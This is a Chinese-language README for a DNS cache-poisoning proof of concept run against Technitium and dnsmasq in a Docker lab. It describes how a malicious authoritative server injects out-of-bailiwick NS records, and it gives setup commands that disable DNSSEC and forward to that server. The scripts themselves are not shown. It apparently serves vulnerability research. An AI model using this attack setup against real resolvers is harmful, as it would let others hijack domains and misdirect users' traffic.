# DNS Authority-NS-RDATA 缓存投毒 PoC

验证 **Technitium DNS Server** 和 **dnsmasq** 是否存在 DNS 缓存投毒漏洞：当递归解析器/转发器从上游权威服务器收到合法响应时，如果 Authority 段包含 **out-of-bailiwick 的 NS 记录**，解析器是否会错误缓存这些记录，导致其他域名被劫持。

此漏洞类型已在多个 DNS 实现上获得 CVE：

- CVE-2025-11411（Unbound）
- CVE-2021-25220（BIND9）
- CVE-2022-32983（Knot Resolver）

## 攻击原理

```
攻击者控制 attacker.lab 的权威服务器
         ↓
用户通过 technitium/dnsmasq 查询 test.attacker.lab
         ↓
解析器向攻击者的权威服务器发送真实查询
         ↓
攻击者返回合法响应（TXID ✓  源地址 ✓  Question ✓）：
  Answer:     test.attacker.lab.  A  6.6.6.7          ← 合法
  Authority:  victim.lab.         NS ns1.evil.attacker.lab.  ← 恶意（out-of-bailiwick）
  Additional: ns1.evil.attacker.lab. A 172.21.0.99    ← 恶意 glue
         ↓
如果解析器的 bailiwick check 有缺陷 → victim.lab 的所有查询被劫持
```

关键点：攻击者不需要伪造 IP，不需要猜测 Transaction ID。所有标准验证检查均通过，**唯一的安全防线是 bailiwick check**。

## 文件清单

| 文件 | 说明 |
|------|------|
| `malicious_auth_server.py` | 恶意权威服务器，对 `*.attacker.lab` 查询返回合法 Answer + out-of-bailiwick Authority NS |
| `test_cache_poison.py` | 自动化验证脚本，完成 基线→触发→等待→检测→验证 全流程 |
| `run_full_test.sh` | 一键测试脚本，串联启动恶意服务器 + 测试两个目标 + 汇总结果 |
| `poc_unsolicited_response.py` | 附加 PoC：测试解析器是否接受凭空发送的未请求 DNS 响应（纯标准库实现） |
| `b_results/Spoofed_Response_Authority_NS_RDATA_response.txt` | 原始 PoC 威胁模型描述 |

## 环境要求

### 宿主机

- macOS 或 Linux
- Docker Desktop / Docker Engine
- Python 3.8+
- `dig` 命令（macOS 自带，Linux 安装 `dnsutils`）

### Python 依赖

```bash
pip3 install scapy dnspython
```

## 环境搭建

### 1. 启动 Docker 容器

```bash
cd ~/dns-lab
docker compose up -d
```

启动 3 个容器：

| 容器 | IP | 宿主端口 | 角色 |
|------|-----|---------|------|
| `bind9` | 172.21.0.10 | 5300 | 权威服务器（victim.lab + attacker.lab） |
| `technitium` | 172.21.0.20 | 5320（DNS）/ 5380（Web UI） | 递归解析器（测试目标 1） |
| `dnsmasq` | 172.21.0.30 | 5322 | 缓存转发器（测试目标 2） |

### 2. 配置 Technitium

首次启动需通过 API 配置（自动化）：

```bash
# 登录获取 token
TOKEN=$(curl -s "http://localhost:5380/api/user/login?user=admin&pass=admin123" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# 关闭 DNSSEC、开启递归、设置转发器
curl -s "http://localhost:5380/api/settings/set?token=$TOKEN&dnssecValidation=false&recursion=Allow&forwarders=172.21.0.10&forwarderProtocol=Udp"

# 添加 attacker.lab 条件转发到恶意权威服务器（192.168.65.254 是 macOS Docker 宿主机地址）
curl -s "http://localhost:5380/api/zones/create?token=$TOKEN&zone=attacker.lab&type=Forwarder&protocol=Udp&forwarder=192.168.65.254:9953"

# 清除缓存
curl -s "http://localhost:5380/api/cache/flush?token=$TOKEN"
```

> **注意**：`192.168.65.254` 是 macOS Docker Desktop 下容器访问宿主机的地址（`host.docker.internal`）。Linux 上可能需要改为 Docker 网关 IP 或 `172.17.0.1`。可通过 `docker exec dnsmasq nslookup host.docker.internal` 确认。

### 3. 配置 dnsmasq

`dnsmasq.conf` 中需包含到恶意服务器的转发规则（已预配置）：

```
server=172.21.0.10
server=/attacker.lab/192.168.65.254#9953
cache-size=10000
```

修改后需重启：`docker restart dnsmasq`

### 4. 验证环境正常

```bash
dig @127.0.0.1 -p 5300 www.victim.lab A +short    # 期望: 1.2.3.4
dig @127.0.0.1 -p 5300 www.attacker.lab A +short   # 期望: 6.6.6.6
dig @127.0.0.1 -p 5320 www.victim.lab A +short     # 期望: 1.2.3.4
dig @127.0.0.1 -p 5322 www.victim.lab A +short     # 期望: 1.2.3.4
```

## 运行 PoC

### 方式一：一键测试（推荐）

```bash
cd ~/Projects/DNS
./run_full_test.sh
```

该脚本会自动：
1. 检查 Docker 容器和依赖
2. 启动恶意权威服务器（端口 9953）
3. 清除两个目标的缓存
4. 依次测试 Technitium 和 dnsmasq
5. 汇总结果并停止恶意服务器

### 方式二：手动分步执行

**终端 1** — 启动恶意权威服务器：

```bash
python3 malicious_auth_server.py --port 9953
```

保持运行，会打印收到的每个查询及响应内容。

**终端 2** — 测试 Technitium：

```bash
# 清缓存
curl -s "http://localhost:5380/api/cache/flush?token=<TOKEN>"

# 运行测试
python3 test_cache_poison.py \
    --target-ip 127.0.0.1 \
    --target-port 5320 \
    --target-name Technitium
```

**终端 2** — 测试 dnsmasq：

```bash
# 清缓存（重启）
docker restart dnsmasq && sleep 2

# 运行测试
python3 test_cache_poison.py \
    --target-ip 127.0.0.1 \
    --target-port 5322 \
    --target-name dnsmasq
```

**终端 1** — 测试完成后 Ctrl+C 停止恶意服务器。

### 方式三：附加 PoC（Unsolicited Response）

测试解析器是否接受凭空发送的伪造 DNS 响应（无需恶意服务器）：

```bash
python3 poc_unsolicited_response.py
```

## 输出示例

### 发现漏洞时

```
[Step 2] 触发: 查询 test.attacker.lab A
  → Answer: 6.6.6.7
  → ⚠ 触发响应中直接包含恶意记录:
    AUTHORITY: victim.lab. NS ns1.evil.attacker.lab.
    AUTHORITY: victim.lab. NS ns2.evil.attacker.lab.

[Step 4] 检测: 查询 victim.lab NS
  → victim.lab. NS ns1.evil.attacker.lab. ⚠ OUT-OF-BAILIWICK — 缓存已被投毒!

  ⚠ 结论: <target> 存在 VULNERABLE
```

### 安全时

```
[Step 2] 触发: 查询 test.attacker.lab A
  → Answer: 6.6.6.7
  → 触发响应中未直接暴露恶意记录（可能已被解析器过滤）

[Step 4] 检测: 查询 victim.lab NS
  → victim.lab. NS ns1.victim.lab.

  ✓ 结论: <target> is NOT VULNERABLE
```

## 测试结果

| 目标 | 版本 | 过滤 Authority 段恶意 NS | 缓存投毒 | 向下游暴露恶意数据 | 结论 |
|------|------|-------------------------|---------|-------------------|------|
| Technitium | v14.3 | **是** — 完全过滤 | 否 | 否 | NOT VULNERABLE |
| dnsmasq | v2.91 | **否** — 原样透传 | 否（不缓存 Authority 段） | **是** | VULNERABLE（透传恶意数据） |

### 关键发现

- **Technitium** 在转发层面就执行了严格的 bailiwick check，恶意 Authority NS 记录被完全丢弃，下游客户端完全看不到
- **dnsmasq** 不过滤 Authority 段，将恶意 NS 记录**原样透传**给客户端。虽然 dnsmasq 自身不缓存 Authority 段记录（只缓存 Answer），但在 dnsmasq → 另一个递归解析器的链式部署中，下游解析器可能缓存这些恶意 NS

## 清理环境

```bash
cd ~/dns-lab
docker compose down -v
```

## 免责声明

本项目仅用于安全研究，所有不安全配置均为测试目的故意为之。请在隔离环境中运行，不要用于生产网络。
